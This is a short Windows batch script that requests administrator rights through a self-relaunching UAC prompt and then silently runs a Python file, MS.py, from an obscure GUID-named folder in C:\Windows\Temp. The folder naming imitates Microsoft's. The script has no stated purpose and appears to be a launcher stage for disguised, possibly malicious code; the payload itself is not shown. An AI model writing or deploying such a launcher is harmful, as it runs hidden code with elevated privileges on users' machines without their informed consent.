@echo off
:: BatchGotAdmin
:-------------------------------------
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
:: End BatchGotAdmin

set "userprofilepath=%userprofile%"
for %%F in ("%userprofilepath%") do set "username=%%~nxF"

python "C:\Windows\Temp\_4TUE8454-R001-4242-PX00-00EJKS343214\MSAS\MS.py"
exit